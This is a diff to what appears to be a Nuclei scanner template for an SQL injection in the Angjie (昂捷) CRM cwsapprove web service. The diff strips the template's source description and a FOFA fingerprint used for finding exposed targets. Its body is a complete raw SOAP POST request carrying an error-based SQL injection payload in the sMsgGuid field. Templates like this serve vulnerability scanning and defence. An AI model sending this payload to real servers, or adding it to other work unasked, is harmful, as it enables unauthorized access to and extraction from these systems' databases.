@@ -3,12 +3,8 @@ info:
   name: 昂捷CRM cwsapprove存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zrn808p2mgd1rufr'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zrn808p2mgd1rufr
-    fofa: body="/Scripts/EnjoyMsg.js"
 http:
 - raw:
   - "POST /EnjoyRMIS_WS/WS/Approve/cwsapprove.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/EndBillApprove1\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <EndBillApprove1 xmlns=\"http://tempuri.org/\">\n      <sMsgGuid>' AND 9173 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (9173=9173) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(112)+CHAR(113))) AND 'rhYc'='rhYc</sMsgGuid>\n      <sUserno>string</sUserno>\n      <sEformDataIp>string</sEformDataIp>\n    </EndBillApprove1>\n  </soap:Body>\n</soap:Envelope>"
